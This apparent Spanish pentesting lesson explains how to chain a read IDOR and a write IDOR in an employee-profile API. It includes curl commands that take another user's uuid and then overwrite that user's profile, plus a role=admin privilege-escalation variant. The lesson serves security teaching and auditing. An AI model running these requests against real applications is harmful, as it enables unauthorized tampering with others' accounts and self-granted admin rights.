# Encadenamiento de vulnerabilidades IDOR

## Por qué combinar IDOR de lectura e IDOR de escritura multiplica el impacto

En el apartado anterior se vio que una API puede tener controles de acceso parciales: protegida en escritura (requiere conocer el `uuid` del usuario para modificar sus datos) pero abierta en lectura (devuelve esos datos, incluyendo el `uuid`, sin verificar si el solicitante tiene permiso).

Este es exactamente el escenario donde **encadenar** dos vulnerabilidades IDOR distintas convierte dos hallazgos de impacto limitado en uno de impacto mucho mayor:

```
Paso 1: IDOR de lectura  → GET /profile/api.php/profile/2 → obtenemos uuid de usuario 2
Paso 2: IDOR de escritura → PUT /profile/api.php/profile/2 con el uuid correcto → modificamos su perfil
```

El primer paso proporciona la información que el segundo paso necesita para eludir su única defensa. Por separado, la lectura no autorizada ya es grave; la escritura, sin el `uuid`, estaba bloqueada. Combinados, el atacante tiene acceso de lectura y escritura sobre datos ajenos.

## El flujo de encadenamiento completo

En el ejemplo de la aplicación de gestión de empleados:

```bash
# 1. Leer el perfil de otro usuario via GET (IDOR de información)
curl -s "http://objetivo/profile/api.php/profile/2" \
     -b "role=employee" | jq
# -> {"uid":2, "uuid":"4a9bd19b3b8676199763d0...", "role":"employee", ...}

# 2. Usar el uuid obtenido para modificar su perfil (IDOR de función)
curl -X PUT "http://objetivo/profile/api.php/profile/2" \
     -H "Content-Type: application/json" \
     -b "role=employee" \
     -d '{"uid":2,"uuid":"4a9bd19b3b8676199763d0...","full_name":"modificado","email":"..."}'
```

El primer IDOR proporciona exactamente el material que el segundo necesita para funcionar — ilustrando por qué en pentesting nunca hay que detenerse en el primer hallazgo y asumir que "no hay nada más".

## Escalada de privilegios vía encadenamiento

Una variante más grave: si la API de lectura devuelve también el campo `role` de un usuario administrador, y si luego la API de escritura no valida que el solicitante tiene permiso para asignar ese rol, el encadenamiento permite:

```
GET /profile/api.php/profile/X  → obtener uuid del administrador
PUT /profile/api.php/profile/propioUID  → con role=admin en el cuerpo
```

El resultado: un usuario estándar se otorga a sí mismo privilegios de administrador, usando información filtrada por el IDOR de lectura para superar la validación parcial del IDOR de escritura.

## Por qué esto aparece incluso en aplicaciones bien intencionadas

Las protecciones parciales — correctas en un verbo, ausentes en otro; presentes en un endpoint, olvidadas en el contiguo — son extremadamente comunes precisamente porque los equipos de desarrollo suelen implementar controles de seguridad de forma reactiva, endpoint por endpoint, en lugar de de forma transversal desde el diseño. Un auditor que solo prueba "el caso obvio" (cambiar el uid en la URL principal) y no mapea sistemáticamente todos los endpoints de la API puede pasar por alto exactamente este tipo de cadena.

## Conectando con el principio de prueba exhaustiva de verbos y endpoints

Este apartado refuerza la misma lección que el de manipulación de verbos HTTP: la seguridad de una aplicación no es solo la suma de los controles individuales de cada endpoint o verbo — es la consistencia de esos controles a través de **toda** la superficie de la aplicación. Una sola omisión puede abrir una cadena de explotación que supere controles que, individualmente, parecían robustos.
